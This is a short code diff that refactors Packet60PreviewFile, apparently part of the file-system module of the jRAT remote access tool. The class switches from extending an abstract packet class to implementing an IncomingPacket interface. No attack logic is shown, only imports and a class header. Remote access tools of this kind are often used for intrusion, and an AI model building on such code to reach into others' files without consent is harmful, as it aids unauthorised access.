@@ -1,14 +1,14 @@
 package jrat.module.fs.packets;
 
 import jrat.client.Connection;
-import jrat.client.packets.incoming.AbstractIncomingPacket;
+import jrat.client.packets.incoming.IncomingPacket;
 
 import java.io.BufferedReader;
 import java.io.FileInputStream;
 import java.io.InputStreamReader;
 
 
-public class Packet60PreviewFile extends AbstractIncomingPacket {
+public class Packet60PreviewFile implements IncomingPacket {
 
 	@Override
 	public void read(Connection con) throws Exception {
